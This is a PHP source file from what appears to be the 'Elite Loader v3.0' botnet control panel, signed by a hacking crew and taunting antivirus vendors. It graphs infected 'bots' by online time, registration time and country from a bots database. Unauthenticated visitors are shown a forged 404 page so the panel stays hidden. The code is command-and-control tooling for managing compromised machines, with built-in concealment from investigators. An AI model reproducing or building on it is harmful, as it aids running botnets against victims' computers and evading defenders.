<?php
#################################################
#             Elite Loader v3.0                 #
#                                               #
#    (c)oded by [PRO]MAKE.ME TeaM :P            #
#                                               #
# To BBC and McAfee:                            #
# Project to capture The World                  #
#                      in the implementation.   #
#                                               #
#            You lose! Who next? :)             #
#                                               #
#################################################
require('../config.php');
require('../sys/mysql_class.php');
include('jpgraph/jpgraph.php');
error_reporting(0);
if((!isset($_SERVER['PHP_AUTH_USER'])) || !(($_SERVER['PHP_AUTH_USER'] == ROOT_LOGIN) && ($_SERVER['PHP_AUTH_PW'] == ROOT_PASSW))){
    @header('Status: 404 Not Found');
    @header('HTTP/1.1 404 Not Found');
    @header("Retry-After: 120");
    @header("Connection: Close");
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL '.$_SERVER['PHP_SELF'].' was not found on this server.</p>
    </body></html>';
    die();
}
$db=new db;
$db->connect(DB_USER,DB_PASS,DB_NAME);
function procent($all,$val){ return intval(($val/$all)*100); }
switch($_GET['type']){
  case 'bots':
    include("jpgraph/jpgraph_line.php");
    function TimeCallback($aVal){ return date("d.m.y\nH:i:s",$aVal); }
    $datax = array();
    $datay = array();
    $result = $db->query("SELECT `lasttime`,count(`id`) as 'count' FROM `".PREFIX."_bots` WHERE `lasttime` >= '".date('Y-m-d H:i:s',strtotime("-1 day"))."' GROUP BY DATE_FORMAT(`lasttime`,'%Y-%m-%d %H:00:00') ORDER BY `lasttime` ASC");
    while($bot = $db->get_row($result)){
      $datax[] = strtotime($bot['lasttime']);
      $datay[] = $bot['count'];
    }
    $db->free();
    $datax2 = array();
    $datay2 = array();
    $result = $db->query("SELECT `regtime`,count(`id`) as 'count' FROM `".PREFIX."_bots` WHERE `regtime` >= '".date('Y-m-d H:i:s',strtotime("-1 day"))."' GROUP BY DATE_FORMAT(`regtime`,'%Y-%m-%d %H:00:00')");
    while($bot = $db->get_row($result)){
      $datax2[] = strtotime($bot['regtime']);
      $datay2[] = $bot['count'];
    }
    $db->free();

    $graph = new Graph(550,222);
    $graph->SetMarginColor('black@0.95');
    $graph->SetMargin(40,20,30,50);
    $graph->title->Set('OnLine Stats');
    $graph->SetAlphaBlending();
    if(min($datay) > min($datay2)){ $min = min($datay2); }else{ $min = min($datay); }
    if((max($datay2)+(max($datay2)/10)) > (max($datay)+(max($datay)/10))){ $max = (max($datay2)+(max($datay2)/10)); }else{ $max = (max($datay)+(max($datay)/10)); }
    $graph->SetScale("intlin",$min,$max,(time()-1*24*60*60),time());
    #$graph->SetScale("intlin");
    $graph->xaxis->SetLabelFormatCallback('TimeCallback');
    $graph->xaxis->SetFont(FF_FONT1,FS_NORMAL);
    $p1 = new LinePlot($datay,$datax);
    $p1->SetColor("red@0.5");
    $p1->SetFillColor("red@0.5");
    #$p1->value->Show();
    #$p1->value->SetColor("black@0.3");
    #$p1->value->SetFont(FF_ARIAL,FS_NORMAL,6);
    $p2 = new LinePlot($datay2,$datax2);
    $p2->SetColor("green@0.7");
    $p2->SetFillColor("green@0.7");
    #$p2->value->Show();
    #$p2->value->SetColor("black@0.3");
    #$p2->value->SetFont(FF_ARIAL,FS_NORMAL,6);
    $graph->Add($p2);
    $graph->Add($p1);
    $graph->Stroke();
  break;

  case 'country24':
    include("jpgraph/jpgraph_pie.php");
    include("jpgraph/jpgraph_pie3d.php");
    $datax = array();
    $legend = array();
    $sum = 0;
    $result = $db->query("SELECT `country`,count(`id`) as 'count' FROM `".PREFIX."_bots` WHERE `regtime` >= '".date('Y-m-d H:i:s',strtotime("-1 day"))."' GROUP BY `country` ORDER BY `count` DESC LIMIT 10");
    while($c = $db->get_row($result)){
      $legend[] = $c['country']." ".$c['count'];
      $datax[] = $c['count'];
      $sum += $c['count'];
    }
    $db->free();
    $data = array();
    foreach($datax as $key){
      $data[] = procent($sum,$key);
    }
    $graph = new PieGraph(550,222,"auto");
    $graph->SetMarginColor('black@0.95');
    $graph->title->Set("Country 24hours Stats");
    #$graph->title->SetFont(FF_FONT1,FS_BOLD);
    $p1 = new PiePlot3D($data);
    $p1->SetCenter(0.4);
    #$p1->value->SetFont(FF_ARIAL,FS_NORMAL,8);
    $p1->SetLegends($legend);
    if(count($data) > 0){ $graph->Add($p1); }
    $graph->Stroke();
  break;

  case 'country':
    include("jpgraph/jpgraph_pie.php");
    include("jpgraph/jpgraph_pie3d.php");
    $datax = array();
    $legend = array();
    $sum = 0;
    $result = $db->query("SELECT `country`,count(`id`) as 'count' FROM `".PREFIX."_bots` GROUP BY `country` ORDER BY `count` DESC LIMIT 10");
    while($c = $db->get_row($result)){
      $legend[] = $c['country']." ".$c['count'];
      $datax[] = $c['count'];
      $sum += $c['count'];
    }
    $db->free();
    $data = array();
    foreach($datax as $key){
      $data[] = procent($sum,$key);
    }
    $graph = new PieGraph(550,222,"auto");
    $graph->SetMarginColor('black@0.95');
    $graph->title->Set("Country Stats");
    #$graph->title->SetFont(FF_FONT1,FS_BOLD);
    $p1 = new PiePlot3D($data);
    $p1->SetCenter(0.4);
    #$p1->value->SetFont(FF_ARIAL,FS_NORMAL,8);
    $p1->SetLegends($legend);
    if(count($data) > 0){ $graph->Add($p1); }
    $graph->Stroke();
  break;
}
$db->close();
?>
